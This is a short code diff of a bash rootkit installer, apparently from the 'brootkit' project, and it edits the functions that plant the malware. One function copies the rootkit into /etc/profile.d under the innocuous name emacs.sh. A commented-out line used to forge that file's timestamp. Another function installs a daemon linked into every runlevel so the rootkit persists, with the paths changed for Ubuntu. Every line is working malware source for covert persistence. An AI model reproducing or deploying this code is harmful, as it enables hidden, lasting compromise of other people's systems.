@@ -7,7 +7,7 @@ declare br_os_type=0
 function br_install_rootkit()
 {
 	cp brootkit.sh /etc/profile.d/emacs.sh
-	touch -r /etc/profile.d/vim.sh /etc/profile.d/emacs.sh
+	#touch -r /etc/profile.d/vim.sh /etc/profile.d/emacs.sh
 }
 
 function br_hookhup()
@@ -51,10 +51,10 @@ function br_ubuntu_install()
 {
 	local idx
 
-	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
+	cp brdaemon.sh /etc/init.d/brdaemon
 	for idx in 0 1 2 3 4 5 6
 	do
-		ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc$idx.d/S10brdaemon
+		ln -s /etc/init.d/brdaemon /etc/rc$idx.d/S10brdaemon
 		[ $? -eq 1 ] && echo "copy brdaemon $idx failed." && exit
 	done
 }
